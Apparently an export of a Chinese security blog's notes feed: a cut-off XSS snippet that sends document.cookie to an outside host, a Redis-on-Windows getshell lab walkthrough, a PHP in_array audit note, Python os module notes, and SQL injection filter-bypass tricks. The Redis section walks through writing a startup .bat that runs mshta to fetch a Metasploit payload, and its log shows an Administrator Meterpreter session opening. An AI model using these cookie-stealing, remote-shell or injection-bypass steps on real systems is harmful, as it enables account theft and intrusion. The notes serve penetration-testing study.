<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var n0t = document.createElement(&quot;link&quot;);</span><br><span class="line">n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">n0t.setAttribute(&quot;href&quot;, &quot;//xss.com/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(n0t)</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Redis在Windows环境下Getshell]]></title>
      <url>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="环境搭建">环境搭建</span></h3><p>windows版本redis:   <a href="https://github.com/MicrosoftArchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi" target="_blank" rel="noopener"><strong>Redis-x64-3.2.100.msi</strong></a></p>
<p>靶机环境： windows server 2012 </p>
<p>​            IP:   10.107.11.76</p>
<p>攻击环境： kali linux</p>
<p>​            IP:    10.107.10.77</p>
<h3><span id="模拟redis未授权环境">模拟redis未授权环境</span></h3><p>编辑<code>Redis</code>目录中的<code>redis.windows.conf</code>配置文件，如下设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>
<p>这样我们就得到了一个未授权的环境。</p>
<h3><span id="模拟攻击">模拟攻击</span></h3><h4><span id="mshta-ps_shell">mshta PS_shell</span></h4><p>这里我们要用到<code>PS_shell.rb</code>这个脚本，下载地址如下：</p>
<p><a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb" target="_blank" rel="noopener">PS_shell.rb</a></p>
<p>下载脚本放到<code>/usr/share/metasploit-framework/modules/exploits/windows/</code>目录下。</p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
<p>加载攻击脚本，然后执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/PS_shell</span><br><span class="line">msf exploit(windows/PS_shell) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/PS_shell):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/PS_shell) &gt; set uripath 123</span><br><span class="line">uripath =&gt; 123</span><br><span class="line"></span><br><span class="line">msf exploit(windows/PS_shell) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.107.10.77:4444 </span><br><span class="line">msf exploit(windows/PS_shell) &gt; [*] Using URL: http://0.0.0.0:8080/123</span><br><span class="line">[*] Local IP: http://10.107.10.77:8080/123</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://10.107.10.77:8080/123&quot;</span><br></pre></td></tr></table></figure>
<p>从以上结果来看我们只需要执行<code>mshta.exe &quot;http://10.107.10.77:8080/123&quot;</code>这个命令就可以得到一个反弹的shell了。</p>
<h4><span id="redis未授权写文件">redis未授权写文件</span></h4><p>这里我们回到<code>windows</code>版本下的<code>redis</code>。利用这个未授权进行写文件。</p>
<p>在<code>linux</code>环境下，<code>redis</code>未授权可以利用以下方法利用：</p>
<ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<p>我们常用的就是前三种，但是在<code>windows</code>这些都是不成立的。</p>
<p>在网上找了不少资料，<code>windows</code>环境下的<code>redis</code>未授权利用的文章还是比较少的，可以利用的点就是<code>启动项</code>了，</p>
<p>但是还是比较鸡肋的，需要目标机器重启。</p>
<p>另外我在<code>T00ls.net</code>看到的有人回复有如下方法：</p>
<ol>
<li>lpk，sethc，启动项，mof，ink劫持</li>
<li>写个hta下载powershell执行写入文件 metasploit等管理员上线</li>
</ol>
<p>第一个对于<code>redis</code>未授权写文件来说到除启动项，其他的对于写文件来说都是比较麻烦的。</p>
<p>第二个就是还是麻烦的，既然可以利用<code>mshta</code>了就可以利用我上面说的<code>PS_shell.rb</code>这个脚本了。</p>
<p>这里还是利用<code>PS_shell.rb</code>生成一个恶意链接，利用<code>mshta</code>这个命令来执行这个恶意链接反弹一个shell。</p>
<p>执行命令最简单的就是用<code>bat</code>文件了。我们只需要写入一个<code>eval.bat</code>来执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe &quot;http://10.107.10.77:8080/123&quot;</span><br></pre></td></tr></table></figure>
<p>等待目标重启，我们就可以得到shell了。</p>
<p>写文件的时候需要注意的就是：<code>redis</code>写文件会自动生成一个<code>redis</code>版本信息，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007?redis-ver3.2.100?redis-bits繞?ctime聤K][?used-mem篓? ? ?</span><br></pre></td></tr></table></figure>
<p>所以我们需要处理一下，在<code>bat</code>中每一行当做一条命令执行。这里我们需要换行，换行也要注意的是。这里要用到<code>\r\n</code>，而且一个<code>\r\n</code>是不行的。这里我们用两个或多个<code>\r\n</code>来进行换行。</p>
<p>未授权连接到<code>redis</code>，执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet 10.107.11.76 6379</span><br><span class="line">Trying 10.107.11.76...</span><br><span class="line">Connected to 10.107.11.76.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename 1.bat</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename 1.bat</span><br><span class="line">+OK</span><br><span class="line">set x &quot;\r\n\r\nmshta http://10.107.10.77:8080/123\r\n\r\n&quot;</span><br><span class="line">+OK</span><br><span class="line">save </span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
<p>我们这边手动重启靶机，就可以反弹一个shell了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/PS_shell) &gt; </span><br><span class="line">[*] 10.107.11.76     PS_shell - Delivering payload</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.107.11.76</span><br><span class="line">[*] Meterpreter session 5 opened (10.107.10.77:4444 -&gt; 10.107.11.76:49160) at 2018-07-30 23:05:42 -0400</span><br><span class="line">sessions -i 5</span><br><span class="line">[*] Starting interaction with 5...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-HMRM0QMQ2QQ\Administrator</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP SECURITY CALENDAR 2017]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP-SECURITY-CALENDAR-2017.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>今天在先知论坛看帖子发现了一个网站<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">php-security-calendar-2017</a></p>
<p>这个网站是一个PHP代码审计的网站，讲到的是PHP中一些函数的用法和注意。这里简单的记录下。</p>
<h3><span id="day-1-wish-list">Day 1 - Wish List</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp_name&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br></pre></td></tr></table></figure>
<p>这个题目说的是<code>in_array()</code>函数的问题</p>
<p>查看<code>in_array()</code>函数的定义</p>
<pre><code>in_array ：(PHP 4, PHP 5, PHP 7)

功能 ：检查数组中是否存在某个值

定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )

在 $haystack 中搜索 $needle ，

如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，

检查 $needle 的类型是否和 $haystack 中的相同。

如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。
</code></pre><p>在这个题目中用<code>in_array()</code>来检查文件名是为<code>range(1,24)</code>生成的数字。</p>
<p>但是在定义中的第三个参数没有设置为<code>TRUE</code>,所以这种检查是不严格的。</p>
<p>例如<code>1a</code>会被强制转换为<code>1</code>进行比较，也就有<code>1a=1</code>绕过检查。</p>
<p>在先知的帖子下面关于这个函数有一端代码关于<code>in_array</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(</span><br><span class="line">    &apos;egg&apos; =&gt; true,</span><br><span class="line">    &apos;cheese&apos; =&gt; false,</span><br><span class="line">    &apos;hair&apos; =&gt; 765,</span><br><span class="line">    &apos;goblins&apos; =&gt; null,</span><br><span class="line">    &apos;ogres&apos; =&gt; &apos;no ogres allowed in this array&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// Loose checking -- return values are in comments</span><br><span class="line"></span><br><span class="line">// First three make sense, last four do not</span><br><span class="line"></span><br><span class="line">var_dump(in_array(null, $array)); // true</span><br><span class="line">var_dump(in_array(false, $array)); // true</span><br><span class="line">var_dump(in_array(765, $array)); // true</span><br><span class="line">var_dump(in_array(763, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(array(), $array)); // true</span><br><span class="line"></span><br><span class="line">// Strict checking</span><br><span class="line">var_dump(in_array(null, $array, true)); // true</span><br><span class="line">var_dump(in_array(false, $array, true)); // true</span><br><span class="line">var_dump(in_array(765, $array, true)); // true</span><br><span class="line">var_dump(in_array(763, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(array(), $array, true)); // false</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>所以在使用<code>in_array</code>函数时需要设置第三个参数进行严格的比较即对数据类型也进行比较。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Python常用模块记录]]></title>
      <url>https://uknowsec.cn/posts/notes/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E8%AE%B0%E5%BD%95.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="python-os模块">Python os模块</span></h2><p>os 模块提供了非常丰富的方法用来处理文件和目录。</p>
<h3><span id="权限">权限</span></h3><h4><span id="查看权限">查看权限</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.access(path,mode)</span><br><span class="line"></span><br><span class="line">path:指定文件路径</span><br><span class="line">mode:参数参数有F_OK(是否存在),R_OK(可读),W_OK(可写),X_OK(可执行)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os                                                            </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.F_OK)           </span><br><span class="line">True                                                                                         </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.R_OK)           </span><br><span class="line">True                                                                     </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.W_OK)           </span><br><span class="line">True                                                                     </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.X_OK)           </span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<h4><span id="更改权限">更改权限</span></h4><p>os.chmod() 方法用于更改文件或目录的权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">os.chmod(path, mode)</span><br><span class="line"></span><br><span class="line">path -- 文件名路径或目录路径。</span><br><span class="line"> 权限指定：</span><br><span class="line">		stat.S_IXOTH: 其他用户有执行权0o001</span><br><span class="line">		stat.S_IWOTH: 其他用户有写权限0o002</span><br><span class="line">		stat.S_IROTH: 其他用户有读权限0o004</span><br><span class="line">		stat.S_IRWXO: 其他用户有全部权限(权限掩码)0o007</span><br><span class="line">		stat.S_IXGRP: 组用户有执行权限0o010</span><br><span class="line">		stat.S_IWGRP: 组用户有写权限0o020</span><br><span class="line">		stat.S_IRGRP: 组用户有读权限0o040</span><br><span class="line">		stat.S_IRWXG: 组用户有全部权限(权限掩码)0o070</span><br><span class="line">		stat.S_IXUSR: 拥有者具有执行权限0o100</span><br><span class="line">		stat.S_IWUSR: 拥有者具有写权限0o200</span><br><span class="line">		stat.S_IRUSR: 拥有者具有读权限0o400</span><br><span class="line">		stat.S_IRWXU: 拥有者有全部权限(权限掩码)0o700</span><br><span class="line">		stat.S_ISVTX: 目录里文件目录只有拥有者才可删除更改0o1000</span><br><span class="line">		stat.S_ISGID: 执行此文件其进程有效组为文件所在组0o2000</span><br><span class="line">		stat.S_ISUID: 执行此文件其进程有效用户为文件所有者0o4000</span><br><span class="line">		stat.S_IREAD: windows下设为只读</span><br><span class="line">		stat.S_IWRITE: windows下取消只读</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.chmod(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,stat.S_IREAD)</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.W_OK)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.F_OK)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.X_OK)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.R_OK)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<h4><span id="更改所有者">更改所有者</span></h4><p>os.chown() 方法用于更改文件所有者，如果不修改可以设置为 -1, 你需要超级用户权限来执行权限修改操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chown()方法语法格式如下：</span><br><span class="line"></span><br><span class="line">os.chown(path, uid, gid);</span><br><span class="line"></span><br><span class="line">	path -- 设置权限的文件路径</span><br><span class="line"></span><br><span class="line">	uid -- 所属用户 ID</span><br><span class="line"></span><br><span class="line">	gid -- 所属用户组 ID</span><br></pre></td></tr></table></figure>
<h3><span id="目录">目录</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.getcwd() #返回当前工作的目录</span><br><span class="line">&apos;C:\\Users\\Think\\Desktop&apos;</span><br><span class="line">&gt;&gt;&gt; os.listdir(&apos;.&apos;) #返回指定目录下所有的文件和目录名</span><br><span class="line">[&apos;file.txt&apos;, &apos;test&apos;, &apos;caidan.py&apos;, &apos;test.txt&apos;, &apos;test.py&apos;, &apos;test1.py&apos;, &apos;enumerate.py&apos;, &apos;login.py&apos;]</span><br><span class="line">&gt;&gt;&gt; os.remove(&apos;test1.py&apos;) #删除指定文件</span><br><span class="line">&gt;&gt;&gt; os.rmdir(&apos;aaa&apos;)  #删除指定目录</span><br><span class="line">&gt;&gt;&gt; os.mkdir(&apos;directory&apos;)  #创建目录，只能创建一层目录</span><br><span class="line">&gt;&gt;&gt; os.system(&apos;whoami&apos;)  #执行shell命令</span><br><span class="line">Think</span><br><span class="line">&gt;&gt;&gt; os.path.getmtime(&apos;.&apos;) #返回在此path下最后一次修改的时间戳</span><br><span class="line">1530964033.3031383</span><br></pre></td></tr></table></figure>
<h3><span id="文件">文件</span></h3><h4><span id="打开文件">打开文件</span></h4><p>os.open() 方法用于打开一个文件，并且设置需要的打开选项，模式参数mode参数是可选的，默认为 0777。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">os.open(file, flags[, mode]);</span><br><span class="line">	</span><br><span class="line">	file -- 要打开的文件</span><br><span class="line"></span><br><span class="line">	flags -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：</span><br><span class="line"></span><br><span class="line">	os.O_RDONLY: 以只读的方式打开</span><br><span class="line">	os.O_WRONLY: 以只写的方式打开</span><br><span class="line">	os.O_RDWR : 以读写的方式打开</span><br><span class="line">	os.O_NONBLOCK: 打开时不阻塞</span><br><span class="line">	os.O_APPEND: 以追加的方式打开</span><br><span class="line">	os.O_CREAT: 创建并打开一个新文件</span><br><span class="line">	os.O_TRUNC: 打开一个文件并截断它的长度为零（必须有写权限）</span><br><span class="line">	os.O_EXCL: 如果指定的文件存在，返回错误</span><br><span class="line">	os.O_SHLOCK: 自动获取共享锁</span><br><span class="line">	os.O_EXLOCK: 自动获取独立锁</span><br><span class="line">	os.O_DIRECT: 消除或减少缓存效果</span><br><span class="line">	os.O_FSYNC : 同步写入</span><br><span class="line">	os.O_NOFOLLOW: 不追踪软链接</span><br></pre></td></tr></table></figure>
<h3><span id="读取文件">读取文件</span></h3><p>os.read() 方法用于从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.read(fd,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fd -- 文件描述符。</span><br><span class="line"></span><br><span class="line">	n -- 读取的字节。</span><br></pre></td></tr></table></figure>
<h3><span id="删除文件">删除文件</span></h3><p>os.unlink() 方法用于删除文件,如果文件是一个目录则返回一个错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.unlink(path)</span><br><span class="line"></span><br><span class="line">	path -- 删除的文件路径</span><br></pre></td></tr></table></figure>
<h2><span id="python-sys模块">Python sys模块</span></h2>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Web中常见的绕过和技巧]]></title>
      <url>https://uknowsec.cn/posts/notes/Web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="sql注入">SQL注入</span></h2><h4><span id="十六进制绕过引号">十六进制绕过引号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slect table_name from information_schema.table where table_schema=&quot;sqli&quot;;</span><br><span class="line"></span><br><span class="line">slect table_name from information_schema.table where table_schema=0x73716c69;</span><br><span class="line"></span><br><span class="line">slect table_name from information_schema.table where table_schema=CHAR(115, 113, 108, 105);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_1.png" alt=""></p>
<h4><span id="like或者in绕过等号">like或者in绕过等号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id in (1,2,3,4);</span><br><span class="line"></span><br><span class="line">select * from admin where id like 1;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_2.png" alt=""></p>
<h4><span id="join绕过逗号">join绕过逗号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where id = 1 union select 1,2,group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir)</span><br><span class="line"></span><br><span class="line">SELECT * FROM admin where id = 1 union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir))C)</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_3.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_4.png" alt=""></p>
<h4><span id="limit逗号的绕过">limit逗号的绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin limit 0,2;</span><br><span class="line"></span><br><span class="line">select * from admin limit 2 offset 0;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_5.png" alt=""></p>
<h4><span id="between绕过等号">between绕过等号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id between 1 and 3;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_6.png" alt=""></p>
<h4><span id="空格绕过">空格绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1;</span><br><span class="line"></span><br><span class="line">select/**/*/**/from/**/admin/**/where/**/id=1;</span><br><span class="line"></span><br><span class="line">select/*1*/*from/*1*/admin/*1*/where/*1*/id=1;</span><br><span class="line"></span><br><span class="line">select	*	from	admin	where	id=1;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_7.png" alt=""></p>
<h4><span id="符号代替文字绕过">符号代替文字绕过</span></h4><ul>
<li><p>&amp;&amp;代替and</p>
</li>
<li><p>||代替or</p>
</li>
<li><p>| 代替 xor</p>
</li>
</ul>
<h4><span id="mysql注释">MySQL注释</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_8.png" alt=""></p>
<p>SELECT * FROM Users WHERE id =’1’AND MID(VERSION()1,1)=’5’;</p>
